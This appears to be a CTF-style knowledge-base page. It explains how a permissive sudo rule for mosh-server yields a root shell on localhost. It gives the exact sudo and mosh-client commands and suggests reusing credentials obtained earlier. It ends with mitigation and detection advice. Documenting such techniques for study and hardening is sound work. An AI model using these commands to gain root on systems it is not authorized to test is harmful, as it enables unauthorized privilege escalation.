---
title: mosh-server — a root session on localhost
tags: [linux, mosh, privesc, sudo, gtfobins]
---

# mosh-server — a root session on localhost

[🇪🇸 Español](mosh-server-privesc.md) | **English**

## Concept

`mosh-server` creates a UDP server and returns an ephemeral key (`MOSH_KEY`). If `sudo` allows running it as root, the client can connect to `127.0.0.1` with that key and get a shell with the server's privileges.

## When it applies

- `sudo -l` includes unrestricted `mosh-server`.
- The binary is installed and the local UDP port is free.
- The user can run `mosh-client`.

## Procedure

1. Check the sudo rule.
2. Start `mosh-server` as root; note the port and key.
3. Export `MOSH_KEY` and connect with `mosh-client` to localhost.
4. Confirm `id` and read the flag.

```bash
sudo -l
sudo mosh-server new -c 256 -s
# MOSH CONNECT 60001 <KEY>
MOSH_KEY=<KEY> mosh-client 127.0.0.1 60001
```

## Variants

- Use `script -qc` or `socat` if `mosh-client` is missing.
- Choose the port with `-p`; check it is free.
- If `sudo` asks for a password, reuse credentials obtained earlier.

## Limitations

- `mosh-server` must be allowed by sudo.
- The key expires when the server stops.
- The client needs local UDP and an interactive terminal.

## Mitigation and detection

- Do not allow `mosh-server` as root in sudoers.
- Restrict binaries by path and arguments.
- Audit `mosh` sessions and sudo child processes.
- Use `NOEXEC` or a wrapper for interactive commands.

## References

- <https://mosh.org/>
- <https://man7.org/linux/man-pages/man1/mosh-server.1.html>
- <https://gtfobins.github.io/gtfobins/mosh-server/>
